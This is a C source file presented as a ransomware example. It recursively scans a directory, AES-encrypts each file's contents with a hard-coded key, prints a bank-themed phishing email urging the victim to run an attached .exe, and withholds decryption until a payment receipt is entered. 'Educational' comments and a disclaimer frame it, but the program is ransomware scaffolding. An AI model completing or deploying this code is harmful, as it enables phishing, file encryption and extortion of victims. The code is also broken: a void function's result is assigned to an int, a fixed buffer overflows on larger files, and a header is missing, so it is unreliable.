// Created July 23, 2023 - By: Devon Griffith A.K.A. rootPHAGE / 我爱数据
// Run on Windows [ gcc <path to file>\Ransomware_Example_In_C_Part-1.c -o 
// <path to file>\Dynamic_Resolution_Malware_Example.exe then run like any .exe ]

#include <stdio.h>
#include <string.h>
#include <openssl/evp.h>
#include <dirent.h>

// Function to print the hex representation of data
void printHex(const unsigned char* data, size_t len) {
    for (size_t i = 0; i < len; i++) {
        printf("%02x", data[i]);
    }
    printf("\n");
}

// Function to perform AES encryption
void aesEncrypt(const unsigned char* plaintext, int plaintextLen, const unsigned char* key, unsigned char* ciphertext) {
    EVP_CIPHER_CTX* ctx;
    int ciphertextLen, len;

    ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, EVP_aes_128_ecb(), NULL, key, NULL);
    EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintextLen);
    ciphertextLen = len;
    EVP_EncryptFinal_ex(ctx, ciphertext + len, &len);
    ciphertextLen += len;
    EVP_CIPHER_CTX_free(ctx);
}

// Function to perform AES decryption
void aesDecrypt(const unsigned char* ciphertext, int ciphertextLen, const unsigned char* key, unsigned char* decryptedtext) {
    EVP_CIPHER_CTX* ctx;
    int decryptedLen, len;

    ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_128_ecb(), NULL, key, NULL);
    EVP_DecryptUpdate(ctx, decryptedtext, &len, ciphertext, ciphertextLen);
    decryptedLen = len;
    EVP_DecryptFinal_ex(ctx, decryptedtext + len, &len);
    decryptedLen += len;
    EVP_CIPHER_CTX_free(ctx);
}

// Function to scan all files within a directory and its subdirectories
void scanDirectory(const char* directory, const unsigned char* key) {
    DIR* dir = opendir(directory);
    if (dir) {
        struct dirent* entry;
        while ((entry = readdir(dir)) != NULL) {
            if (entry->d_type == DT_REG) { // Check if it's a regular file
                char filepath[256];
                snprintf(filepath, sizeof(filepath), "%s/%s", directory, entry->d_name);

                // Read file content
                FILE* file = fopen(filepath, "r");
                if (file) {
                    fseek(file, 0, SEEK_END);
                    int fileSize = ftell(file);
                    fseek(file, 0, SEEK_SET);

                    unsigned char* fileContent = (unsigned char*)malloc(fileSize);
                    fread(fileContent, 1, fileSize, file);
                    fclose(file);

                    // Encrypt file content
                    unsigned char encrypted[128];
                    aesEncrypt(fileContent, fileSize, key, encrypted);
                    printf("Encrypted file content of '%s': ", filepath);
                    printHex(encrypted, sizeof(encrypted));

                    free(fileContent);
                }
            } else if (entry->d_type == DT_DIR && strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
                char subdir[256];
                snprintf(subdir, sizeof(subdir), "%s/%s", directory, entry->d_name);
                scanDirectory(subdir, key);
            }
        }
        closedir(dir);
    }
}

int main() {
    // Encryption key (128 bits / 16 bytes)
    unsigned char key[] = "ThisIsASecretKey";

    // Phishing Email
    printf("From: support@banking.com\n");
    printf("To: victim@example.com\n");
    printf("Subject: Urgent: Account Security Alert!\n\n");
    printf("Dear Customer,\n\n");
    printf("We have noticed suspicious activity on your account.\n");
    printf("Please open the attached 'AccountVerification.exe' file to verify your identity.\n\n");
    printf("If you believe this email was sent in error, please ignore it.\n");
    printf("Thank you for your cooperation.\n\n");
    printf("Best Regards,\n");
    printf("Banking Support Team\n\n");

    // AES Encryption (For Educational Purposes Only)
    const unsigned char plaintext[] = "Hello, this is a plaintext message.";
    unsigned char ciphertext[128];
    aesEncrypt(plaintext, strlen((const char*)plaintext), key, ciphertext);
    printf("Ciphertext: ");
    printHex(ciphertext, sizeof(ciphertext));

    // File Scanning Process (For Educational Purposes Only)
    const char* targetDirectory = "/path/to/scan";
    printf("\nStep 3: Scanning all files in directory: %s\n", targetDirectory);
    scanDirectory(targetDirectory, key);

    // Validating The Payment and Then Decryption (For Educational Purposes Only)
    unsigned char payment[128];
    printf("\nEnter the payment receipt (Payment sent successfully): ");
    scanf("%s", payment);

    if (strcmp(payment, "PaymentSent") == 0) {
        // Decryption of files (for demonstration purposes only)
        unsigned char encryptedData[128];
        // This would typically be the encrypted data obtained from the victim's system
        // For demonstration, we use the same ciphertext generated earlier
        memcpy(encryptedData, ciphertext, sizeof(ciphertext));

        // Buffer to hold the decrypted data
        unsigned char decryptedData[128];

        // Decrypt the data
        int decryptedLen = aesDecrypt(encryptedData, sizeof(encryptedData), key, decryptedData);

        // Null-terminate the decrypted data to print as a string
        decryptedData[decryptedLen] = '\0';

        // Print the decrypted data
        printf("\nDecrypted Data: %s\n", decryptedData);
    } else {
        printf("Payment not validated. Files will not be decrypted.\n");
    }

    return 0;
}

# DO NOT USE THIS SCRIPT MALICIOUSLY - PROVIDED FOR EDUCATIONAL PURPOSES ONLY
